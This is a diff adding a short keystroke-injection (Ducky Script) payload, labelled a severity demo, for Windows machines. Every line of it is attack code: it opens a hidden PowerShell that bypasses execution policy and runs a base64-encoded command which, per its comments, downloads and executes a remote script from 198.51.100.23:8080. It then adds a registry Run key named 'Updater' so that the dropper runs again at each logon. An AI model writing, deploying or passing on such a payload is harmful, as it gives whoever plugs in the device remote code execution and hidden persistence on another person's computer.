@@ -1,0 +1,16 @@
+REM PowerShell dropper with registry Run-key persistence -- high/critical severity demo
+REM Stage 1: hidden, execution-policy-bypassed PowerShell downloads & runs a remote script.
+REM   (the -enc blob below decodes to:
+REM    IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23:8080/update.ps1') )
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwA6ADgAMAA4ADAALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQA=
+ENTER
+DELAY 2000
+
+REM Stage 2: install a registry Run-key so the dropper survives reboot.
+GUI r
+DELAY 500
+STRING powershell -nop -w hidden -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name Updater -Value 'C:\Users\Public\update.exe' -PropertyType String -Force"
+ENTER
